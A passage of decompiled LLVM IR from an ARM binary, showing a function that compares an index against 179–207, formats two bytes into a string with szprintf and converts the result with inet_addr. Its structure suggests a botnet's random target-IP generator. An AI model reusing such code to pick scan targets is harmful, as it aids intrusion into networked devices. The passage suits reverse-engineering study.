  %v4_cfd0 = sext i8 %v3_cfb8 to i32
  %v6_cfd0 = sext i8 %v3_cfc4 to i32
  %v8_cfd0 = call i32 @szprintf(i32 %v2_cfac, i32 ptrtoint ([13 x i8]* @global_var_20a00.411 to i32), i32 %v4_cfd0, i32 %v6_cfd0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cfd4

dec_label_pc_cfd4:                                ; preds = %dec_label_pc_cfa0, %dec_label_pc_cfac
  %v7_cfd8 = icmp eq i32 %v2_a93c, 179
  br i1 %v7_cfd8, label %dec_label_pc_cfe0, label %dec_label_pc_d008

dec_label_pc_cfe0:                                ; preds = %dec_label_pc_cfd4
  %v2_cfe0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cfec = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_cff8 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d004 = sext i8 %v3_cfec to i32
  %v6_d004 = sext i8 %v3_cff8 to i32
  %v8_d004 = call i32 @szprintf(i32 %v2_cfe0, i32 ptrtoint ([13 x i8]* @global_var_20a10.413 to i32), i32 %v4_d004, i32 %v6_d004, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d008

dec_label_pc_d008:                                ; preds = %dec_label_pc_cfd4, %dec_label_pc_cfe0
  %v7_d00c = icmp eq i32 %v2_a93c, 180
  br i1 %v7_d00c, label %dec_label_pc_d014, label %dec_label_pc_d03c

dec_label_pc_d014:                                ; preds = %dec_label_pc_d008
  %v2_d014 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d020 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_d02c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d038 = sext i8 %v3_d020 to i32
  %v6_d038 = sext i8 %v3_d02c to i32
  %v8_d038 = call i32 @szprintf(i32 %v2_d014, i32 ptrtoint ([13 x i8]* @global_var_20a20.415 to i32), i32 %v4_d038, i32 %v6_d038, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d03c

dec_label_pc_d03c:                                ; preds = %dec_label_pc_d008, %dec_label_pc_d014
  %v7_d040 = icmp eq i32 %v2_a93c, 181
  br i1 %v7_d040, label %dec_label_pc_d048, label %dec_label_pc_d070

dec_label_pc_d048:                                ; preds = %dec_label_pc_d03c
  %v2_d048 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d054 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_d060 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d06c = sext i8 %v3_d054 to i32
  %v6_d06c = sext i8 %v3_d060 to i32
  %v8_d06c = call i32 @szprintf(i32 %v2_d048, i32 ptrtoint ([13 x i8]* @global_var_20a30.417 to i32), i32 %v4_d06c, i32 %v6_d06c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d070

dec_label_pc_d070:                                ; preds = %dec_label_pc_d03c, %dec_label_pc_d048
  %v7_d074 = icmp eq i32 %v2_a93c, 182
  br i1 %v7_d074, label %dec_label_pc_d07c, label %dec_label_pc_d0a4

dec_label_pc_d07c:                                ; preds = %dec_label_pc_d070
  %v2_d07c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d088 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_d094 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d0a0 = sext i8 %v3_d088 to i32
  %v6_d0a0 = sext i8 %v3_d094 to i32
  %v8_d0a0 = call i32 @szprintf(i32 %v2_d07c, i32 ptrtoint ([13 x i8]* @global_var_20a40.419 to i32), i32 %v4_d0a0, i32 %v6_d0a0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d0a4

dec_label_pc_d0a4:                                ; preds = %dec_label_pc_d070, %dec_label_pc_d07c
  %v7_d0a8 = icmp eq i32 %v2_a93c, 183
  br i1 %v7_d0a8, label %dec_label_pc_d0b0, label %dec_label_pc_d0d8

dec_label_pc_d0b0:                                ; preds = %dec_label_pc_d0a4
  %v2_d0b0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d0bc = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_d0c8 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d0d4 = sext i8 %v3_d0bc to i32
  %v6_d0d4 = sext i8 %v3_d0c8 to i32
  %v8_d0d4 = call i32 @szprintf(i32 %v2_d0b0, i32 ptrtoint ([13 x i8]* @global_var_20240.158 to i32), i32 %v4_d0d4, i32 %v6_d0d4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d0d8

dec_label_pc_d0d8:                                ; preds = %dec_label_pc_d0a4, %dec_label_pc_d0b0
  %v7_d0dc = icmp eq i32 %v2_a93c, 184
  br i1 %v7_d0dc, label %dec_label_pc_d0e4, label %dec_label_pc_d10c

dec_label_pc_d0e4:                                ; preds = %dec_label_pc_d0d8
  %v2_d0e4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d0f0 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_d0fc = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d108 = sext i8 %v3_d0f0 to i32
  %v6_d108 = sext i8 %v3_d0fc to i32
  %v8_d108 = call i32 @szprintf(i32 %v2_d0e4, i32 ptrtoint ([13 x i8]* @global_var_20a50.422 to i32), i32 %v4_d108, i32 %v6_d108, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d10c

dec_label_pc_d10c:                                ; preds = %dec_label_pc_d0d8, %dec_label_pc_d0e4
  %v7_d110 = icmp eq i32 %v2_a93c, 185
  br i1 %v7_d110, label %dec_label_pc_d118, label %dec_label_pc_d140

dec_label_pc_d118:                                ; preds = %dec_label_pc_d10c
  %v2_d118 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d124 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_d130 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d13c = sext i8 %v3_d124 to i32
  %v6_d13c = sext i8 %v3_d130 to i32
  %v8_d13c = call i32 @szprintf(i32 %v2_d118, i32 ptrtoint ([13 x i8]* @global_var_20a60.424 to i32), i32 %v4_d13c, i32 %v6_d13c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d140

dec_label_pc_d140:                                ; preds = %dec_label_pc_d10c, %dec_label_pc_d118
  %v7_d144 = icmp eq i32 %v2_a93c, 186
  br i1 %v7_d144, label %dec_label_pc_d14c, label %dec_label_pc_d174

dec_label_pc_d14c:                                ; preds = %dec_label_pc_d140
  %v2_d14c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d158 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_d164 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d170 = sext i8 %v3_d158 to i32
  %v6_d170 = sext i8 %v3_d164 to i32
  %v8_d170 = call i32 @szprintf(i32 %v2_d14c, i32 ptrtoint ([14 x i8]* @global_var_20a70.426 to i32), i32 %v4_d170, i32 %v6_d170, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d174

dec_label_pc_d174:                                ; preds = %dec_label_pc_d140, %dec_label_pc_d14c
  %v7_d178 = icmp eq i32 %v2_a93c, 187
  br i1 %v7_d178, label %dec_label_pc_d180, label %dec_label_pc_d1a8

dec_label_pc_d180:                                ; preds = %dec_label_pc_d174
  %v2_d180 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d18c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_d198 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d1a4 = sext i8 %v3_d18c to i32
  %v6_d1a4 = sext i8 %v3_d198 to i32
  %v8_d1a4 = call i32 @szprintf(i32 %v2_d180, i32 ptrtoint ([14 x i8]* @global_var_20a80.428 to i32), i32 %v4_d1a4, i32 %v6_d1a4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d1a8

dec_label_pc_d1a8:                                ; preds = %dec_label_pc_d174, %dec_label_pc_d180
  %v7_d1ac = icmp eq i32 %v2_a93c, 188
  br i1 %v7_d1ac, label %dec_label_pc_d1b4, label %dec_label_pc_d1dc

dec_label_pc_d1b4:                                ; preds = %dec_label_pc_d1a8
  %v2_d1b4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d1c0 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_d1cc = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d1d8 = sext i8 %v3_d1c0 to i32
  %v6_d1d8 = sext i8 %v3_d1cc to i32
  %v8_d1d8 = call i32 @szprintf(i32 %v2_d1b4, i32 ptrtoint ([14 x i8]* @global_var_20a90.430 to i32), i32 %v4_d1d8, i32 %v6_d1d8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d1dc

dec_label_pc_d1dc:                                ; preds = %dec_label_pc_d1a8, %dec_label_pc_d1b4
  %v7_d1e0 = icmp eq i32 %v2_a93c, 189
  br i1 %v7_d1e0, label %dec_label_pc_d1e8, label %dec_label_pc_d210

dec_label_pc_d1e8:                                ; preds = %dec_label_pc_d1dc
  %v2_d1e8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d1f4 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_d200 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d20c = sext i8 %v3_d1f4 to i32
  %v6_d20c = sext i8 %v3_d200 to i32
  %v8_d20c = call i32 @szprintf(i32 %v2_d1e8, i32 ptrtoint ([14 x i8]* @global_var_20aa0.432 to i32), i32 %v4_d20c, i32 %v6_d20c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d210

dec_label_pc_d210:                                ; preds = %dec_label_pc_d1dc, %dec_label_pc_d1e8
  %v7_d214 = icmp eq i32 %v2_a93c, 190
  br i1 %v7_d214, label %dec_label_pc_d21c, label %dec_label_pc_d244

dec_label_pc_d21c:                                ; preds = %dec_label_pc_d210
  %v2_d21c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d228 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_d234 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d240 = sext i8 %v3_d228 to i32
  %v6_d240 = sext i8 %v3_d234 to i32
  %v8_d240 = call i32 @szprintf(i32 %v2_d21c, i32 ptrtoint ([14 x i8]* @global_var_20ab0.434 to i32), i32 %v4_d240, i32 %v6_d240, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d244

dec_label_pc_d244:                                ; preds = %dec_label_pc_d210, %dec_label_pc_d21c
  %v7_d248 = icmp eq i32 %v2_a93c, 191
  br i1 %v7_d248, label %dec_label_pc_d250, label %dec_label_pc_d278

dec_label_pc_d250:                                ; preds = %dec_label_pc_d244
  %v2_d250 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d25c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_d268 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d274 = sext i8 %v3_d25c to i32
  %v6_d274 = sext i8 %v3_d268 to i32
  %v8_d274 = call i32 @szprintf(i32 %v2_d250, i32 ptrtoint ([14 x i8]* @global_var_20ac0.436 to i32), i32 %v4_d274, i32 %v6_d274, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d278

dec_label_pc_d278:                                ; preds = %dec_label_pc_d244, %dec_label_pc_d250
  %v7_d27c = icmp eq i32 %v2_a93c, 192
  br i1 %v7_d27c, label %dec_label_pc_d284, label %dec_label_pc_d2ac

dec_label_pc_d284:                                ; preds = %dec_label_pc_d278
  %v2_d284 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d290 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_d29c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d2a8 = sext i8 %v3_d290 to i32
  %v6_d2a8 = sext i8 %v3_d29c to i32
  %v8_d2a8 = call i32 @szprintf(i32 %v2_d284, i32 ptrtoint ([13 x i8]* @global_var_20ad0.438 to i32), i32 %v4_d2a8, i32 %v6_d2a8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d2ac

dec_label_pc_d2ac:                                ; preds = %dec_label_pc_d278, %dec_label_pc_d284
  %v7_d2b0 = icmp eq i32 %v2_a93c, 193
  br i1 %v7_d2b0, label %dec_label_pc_d2b8, label %dec_label_pc_d2e0

dec_label_pc_d2b8:                                ; preds = %dec_label_pc_d2ac
  %v2_d2b8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d2c4 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_d2d0 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d2dc = sext i8 %v3_d2c4 to i32
  %v6_d2dc = sext i8 %v3_d2d0 to i32
  %v8_d2dc = call i32 @szprintf(i32 %v2_d2b8, i32 ptrtoint ([13 x i8]* @global_var_20ae0.440 to i32), i32 %v4_d2dc, i32 %v6_d2dc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d2e0

dec_label_pc_d2e0:                                ; preds = %dec_label_pc_d2ac, %dec_label_pc_d2b8
  %v7_d2e4 = icmp eq i32 %v2_a93c, 194
  br i1 %v7_d2e4, label %dec_label_pc_d2ec, label %dec_label_pc_d314

dec_label_pc_d2ec:                                ; preds = %dec_label_pc_d2e0
  %v2_d2ec = ptrtoint i32* %stack_var_-36 to i32
  %v3_d2f8 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_d304 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d310 = sext i8 %v3_d2f8 to i32
  %v6_d310 = sext i8 %v3_d304 to i32
  %v8_d310 = call i32 @szprintf(i32 %v2_d2ec, i32 ptrtoint ([14 x i8]* @global_var_20af0.442 to i32), i32 %v4_d310, i32 %v6_d310, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d314

dec_label_pc_d314:                                ; preds = %dec_label_pc_d2e0, %dec_label_pc_d2ec
  %v7_d318 = icmp eq i32 %v2_a93c, 195
  br i1 %v7_d318, label %dec_label_pc_d320, label %dec_label_pc_d348

dec_label_pc_d320:                                ; preds = %dec_label_pc_d314
  %v2_d320 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d32c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_d338 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d344 = sext i8 %v3_d32c to i32
  %v6_d344 = sext i8 %v3_d338 to i32
  %v8_d344 = call i32 @szprintf(i32 %v2_d320, i32 ptrtoint ([14 x i8]* @global_var_20b00.444 to i32), i32 %v4_d344, i32 %v6_d344, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d348

dec_label_pc_d348:                                ; preds = %dec_label_pc_d314, %dec_label_pc_d320
  %v7_d34c = icmp eq i32 %v2_a93c, 196
  br i1 %v7_d34c, label %dec_label_pc_d354, label %dec_label_pc_d37c

dec_label_pc_d354:                                ; preds = %dec_label_pc_d348
  %v2_d354 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d360 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_d36c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d378 = sext i8 %v3_d360 to i32
  %v6_d378 = sext i8 %v3_d36c to i32
  %v8_d378 = call i32 @szprintf(i32 %v2_d354, i32 ptrtoint ([14 x i8]* @global_var_20b10.446 to i32), i32 %v4_d378, i32 %v6_d378, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d37c

dec_label_pc_d37c:                                ; preds = %dec_label_pc_d348, %dec_label_pc_d354
  %v7_d380 = icmp eq i32 %v2_a93c, 197
  br i1 %v7_d380, label %dec_label_pc_d388, label %dec_label_pc_d3b0

dec_label_pc_d388:                                ; preds = %dec_label_pc_d37c
  %v2_d388 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d394 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_d3a0 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d3ac = sext i8 %v3_d394 to i32
  %v6_d3ac = sext i8 %v3_d3a0 to i32
  %v8_d3ac = call i32 @szprintf(i32 %v2_d388, i32 ptrtoint ([14 x i8]* @global_var_20b20.448 to i32), i32 %v4_d3ac, i32 %v6_d3ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d3b0

dec_label_pc_d3b0:                                ; preds = %dec_label_pc_d37c, %dec_label_pc_d388
  %v7_d3b4 = icmp eq i32 %v2_a93c, 198
  br i1 %v7_d3b4, label %dec_label_pc_d3bc, label %dec_label_pc_d3e4

dec_label_pc_d3bc:                                ; preds = %dec_label_pc_d3b0
  %v2_d3bc = ptrtoint i32* %stack_var_-36 to i32
  %v3_d3c8 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_d3d4 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d3e0 = sext i8 %v3_d3c8 to i32
  %v6_d3e0 = sext i8 %v3_d3d4 to i32
  %v8_d3e0 = call i32 @szprintf(i32 %v2_d3bc, i32 ptrtoint ([14 x i8]* @global_var_20b30.450 to i32), i32 %v4_d3e0, i32 %v6_d3e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d3e4

dec_label_pc_d3e4:                                ; preds = %dec_label_pc_d3b0, %dec_label_pc_d3bc
  %v7_d3e8 = icmp eq i32 %v2_a93c, 199
  br i1 %v7_d3e8, label %dec_label_pc_d3f0, label %dec_label_pc_d418

dec_label_pc_d3f0:                                ; preds = %dec_label_pc_d3e4
  %v2_d3f0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d3fc = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_d408 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d414 = sext i8 %v3_d3fc to i32
  %v6_d414 = sext i8 %v3_d408 to i32
  %v8_d414 = call i32 @szprintf(i32 %v2_d3f0, i32 ptrtoint ([14 x i8]* @global_var_20b40.452 to i32), i32 %v4_d414, i32 %v6_d414, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d418

dec_label_pc_d418:                                ; preds = %dec_label_pc_d3e4, %dec_label_pc_d3f0
  %v7_d41c = icmp eq i32 %v2_a93c, 200
  br i1 %v7_d41c, label %dec_label_pc_d424, label %dec_label_pc_d44c

dec_label_pc_d424:                                ; preds = %dec_label_pc_d418
  %v2_d424 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d430 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_d43c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d448 = sext i8 %v3_d430 to i32
  %v6_d448 = sext i8 %v3_d43c to i32
  %v8_d448 = call i32 @szprintf(i32 %v2_d424, i32 ptrtoint ([14 x i8]* @global_var_20b50.454 to i32), i32 %v4_d448, i32 %v6_d448, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d44c

dec_label_pc_d44c:                                ; preds = %dec_label_pc_d418, %dec_label_pc_d424
  %v7_d450 = icmp eq i32 %v2_a93c, 201
  br i1 %v7_d450, label %dec_label_pc_d48c, label %dec_label_pc_d480

dec_label_pc_d480:                                ; preds = %dec_label_pc_d44c
  br label %dec_label_pc_d4b4

dec_label_pc_d48c:                                ; preds = %dec_label_pc_d44c
  %v2_d458 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d464 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_d470 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d47c = sext i8 %v3_d464 to i32
  %v6_d47c = sext i8 %v3_d470 to i32
  %v8_d47c = call i32 @szprintf(i32 %v2_d458, i32 ptrtoint ([14 x i8]* @global_var_20b60.456 to i32), i32 %v4_d47c, i32 %v6_d47c, i32 ptrtoint (i32* @0 to i32))
  %v3_d498 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_d4a4 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d4b0 = sext i8 %v3_d498 to i32
  %v6_d4b0 = sext i8 %v3_d4a4 to i32
  %v8_d4b0 = call i32 @szprintf(i32 %v2_d458, i32 ptrtoint ([13 x i8]* @global_var_20b70.458 to i32), i32 %v4_d4b0, i32 %v6_d4b0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d4b4

dec_label_pc_d4b4:                                ; preds = %dec_label_pc_d480, %dec_label_pc_d48c
  %v7_d4b8 = icmp eq i32 %v2_a93c, 202
  br i1 %v7_d4b8, label %dec_label_pc_d4c0, label %dec_label_pc_d4e8

dec_label_pc_d4c0:                                ; preds = %dec_label_pc_d4b4
  %v2_d4c0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d4cc = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_d4d8 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d4e4 = sext i8 %v3_d4cc to i32
  %v6_d4e4 = sext i8 %v3_d4d8 to i32
  %v8_d4e4 = call i32 @szprintf(i32 %v2_d4c0, i32 ptrtoint ([13 x i8]* @global_var_20b80.460 to i32), i32 %v4_d4e4, i32 %v6_d4e4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d4e8

dec_label_pc_d4e8:                                ; preds = %dec_label_pc_d4b4, %dec_label_pc_d4c0
  %v7_d4ec = icmp eq i32 %v2_a93c, 203
  br i1 %v7_d4ec, label %dec_label_pc_d4f4, label %dec_label_pc_d51c

dec_label_pc_d4f4:                                ; preds = %dec_label_pc_d4e8
  %v2_d4f4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d500 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_d50c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d518 = sext i8 %v3_d500 to i32
  %v6_d518 = sext i8 %v3_d50c to i32
  %v8_d518 = call i32 @szprintf(i32 %v2_d4f4, i32 ptrtoint ([13 x i8]* @global_var_20b90.462 to i32), i32 %v4_d518, i32 %v6_d518, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d51c

dec_label_pc_d51c:                                ; preds = %dec_label_pc_d4e8, %dec_label_pc_d4f4
  %v7_d520 = icmp eq i32 %v2_a93c, 204
  br i1 %v7_d520, label %dec_label_pc_d528, label %dec_label_pc_d550

dec_label_pc_d528:                                ; preds = %dec_label_pc_d51c
  %v2_d528 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d534 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_d540 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d54c = sext i8 %v3_d534 to i32
  %v6_d54c = sext i8 %v3_d540 to i32
  %v8_d54c = call i32 @szprintf(i32 %v2_d528, i32 ptrtoint ([13 x i8]* @global_var_20ba0.464 to i32), i32 %v4_d54c, i32 %v6_d54c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d550

dec_label_pc_d550:                                ; preds = %dec_label_pc_d51c, %dec_label_pc_d528
  %v7_d554 = icmp eq i32 %v2_a93c, 205
  br i1 %v7_d554, label %dec_label_pc_d55c, label %dec_label_pc_d584

dec_label_pc_d55c:                                ; preds = %dec_label_pc_d550
  %v2_d55c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d568 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_d574 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d580 = sext i8 %v3_d568 to i32
  %v6_d580 = sext i8 %v3_d574 to i32
  %v8_d580 = call i32 @szprintf(i32 %v2_d55c, i32 ptrtoint ([13 x i8]* @global_var_20bb0.466 to i32), i32 %v4_d580, i32 %v6_d580, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d584

dec_label_pc_d584:                                ; preds = %dec_label_pc_d550, %dec_label_pc_d55c
  %v7_d588 = icmp eq i32 %v2_a93c, 206
  br i1 %v7_d588, label %dec_label_pc_d590, label %dec_label_pc_d5b8

dec_label_pc_d590:                                ; preds = %dec_label_pc_d584
  %v2_d590 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d59c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_d5a8 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d5b4 = sext i8 %v3_d59c to i32
  %v6_d5b4 = sext i8 %v3_d5a8 to i32
  %v8_d5b4 = call i32 @szprintf(i32 %v2_d590, i32 ptrtoint ([13 x i8]* @global_var_20bc0.468 to i32), i32 %v4_d5b4, i32 %v6_d5b4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d5b8

dec_label_pc_d5b8:                                ; preds = %dec_label_pc_d584, %dec_label_pc_d590
  %v7_d5bc = icmp eq i32 %v2_a93c, 207
  %v2_d5c4 = ptrtoint i32* %stack_var_-36 to i32
  br i1 %v7_d5bc, label %dec_label_pc_d5c4, label %dec_label_pc_d5ec

dec_label_pc_d5c4:                                ; preds = %dec_label_pc_d5b8
  %v3_d5d0 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_d5dc = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_d5e8 = sext i8 %v3_d5d0 to i32
  %v6_d5e8 = sext i8 %v3_d5dc to i32
  %v8_d5e8 = call i32 @szprintf(i32 %v2_d5c4, i32 ptrtoint ([14 x i8]* @global_var_20bd0.470 to i32), i32 %v4_d5e8, i32 %v6_d5e8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d5ec

dec_label_pc_d5ec:                                ; preds = %dec_label_pc_d5b8, %dec_label_pc_d5c4
  br i1 false, label %dec_label_pc_d5f8, label %dec_label_pc_d620

dec_label_pc_d5f8:                                ; preds = %dec_label_pc_d5ec
  br label %dec_label_pc_d620

dec_label_pc_d620:                                ; preds = %dec_label_pc_d5ec, %dec_label_pc_d5f8
  store i32 %v2_d5c4, i32* @r0, align 4
  %v1_d628 = call i32 @inet_addr(i32 %v2_d5c4)
  store i32 %v3_a7b8, i32* @fp, align 4
  ret i32 %v1_d628

; uselistorder directives
  uselistorder i32 %v2_d5c4, { 1, 0, 2 }
  uselistorder i32 %v0_a8d8, { 1, 0 }
  uselistorder i32 %v0_a88c, { 1, 0 }
  uselistorder i32 %v0_a840, { 1, 0 }
  uselistorder i32 %v0_a7f4, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_20900.379 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_20894.364 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_20704.313 to i32), { 2, 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_20678.295 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_20618.283 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_20260.162 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_20240.158 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_20230.156 to i32), { 2, 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_20200.150 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_d620, { 1, 0 }
  uselistorder label %dec_label_pc_d5ec, { 1, 0 }
  uselistorder label %dec_label_pc_d5b8, { 1, 0 }
  uselistorder label %dec_label_pc_d584, { 1, 0 }
  uselistorder label %dec_label_pc_d550, { 1, 0 }
  uselistorder label %dec_label_pc_d51c, { 1, 0 }
  uselistorder label %dec_label_pc_d4e8, { 1, 0 }
  uselistorder label %dec_label_pc_d4b4, { 1, 0 }
  uselistorder label %dec_label_pc_d44c, { 1, 0 }
  uselistorder label %dec_label_pc_d418, { 1, 0 }
  uselistorder label %dec_label_pc_d3e4, { 1, 0 }
  uselistorder label %dec_label_pc_d3b0, { 1, 0 }
  uselistorder label %dec_label_pc_d37c, { 1, 0 }
  uselistorder label %dec_label_pc_d348, { 1, 0 }
  uselistorder label %dec_label_pc_d314, { 1, 0 }
  uselistorder label %dec_label_pc_d2e0, { 1, 0 }
  uselistorder label %dec_label_pc_d2ac, { 1, 0 }
  uselistorder label %dec_label_pc_d278, { 1, 0 }
  uselistorder label %dec_label_pc_d244, { 1, 0 }
  uselistorder label %dec_label_pc_d210, { 1, 0 }
  uselistorder label %dec_label_pc_d1dc, { 1, 0 }
  uselistorder label %dec_label_pc_d1a8, { 1, 0 }
  uselistorder label %dec_label_pc_d174, { 1, 0 }
  uselistorder label %dec_label_pc_d140, { 1, 0 }
  uselistorder label %dec_label_pc_d10c, { 1, 0 }
  uselistorder label %dec_label_pc_d0d8, { 1, 0 }
  uselistorder label %dec_label_pc_d0a4, { 1, 0 }
  uselistorder label %dec_label_pc_d070, { 1, 0 }
  uselistorder label %dec_label_pc_d03c, { 1, 0 }
  uselistorder label %dec_label_pc_d008, { 1, 0 }
  uselistorder label %dec_label_pc_cfd4, { 1, 0 }
  uselistorder label %dec_label_pc_cfa0, { 1, 0 }
  uselistorder label %dec_label_pc_cf6c, { 1, 0 }
  uselistorder label %dec_label_pc_cf38, { 1, 0 }
  uselistorder label %dec_label_pc_cf04, { 1, 0 }
  uselistorder label %dec_label_pc_ced0, { 1, 0 }
  uselistorder label %dec_label_pc_ce9c, { 1, 0 }
  uselistorder label %dec_label_pc_ce68, { 1, 0 }
  uselistorder label %dec_label_pc_ce34, { 1, 0 }
  uselistorder label %dec_label_pc_ce00, { 1, 0 }
  uselistorder label %dec_label_pc_cdcc, { 1, 0 }
  uselistorder label %dec_label_pc_cd98, { 1, 0 }
  uselistorder label %dec_label_pc_cd64, { 1, 0 }
  uselistorder label %dec_label_pc_cd30, { 1, 0 }
  uselistorder label %dec_label_pc_ccfc, { 1, 0 }
  uselistorder label %dec_label_pc_ccc8, { 1, 0 }
  uselistorder label %dec_label_pc_cc94, { 1, 0 }
  uselistorder label %dec_label_pc_cc60, { 1, 0 }
  uselistorder label %dec_label_pc_cc2c, { 1, 0 }
  uselistorder label %dec_label_pc_cbf8, { 1, 0 }
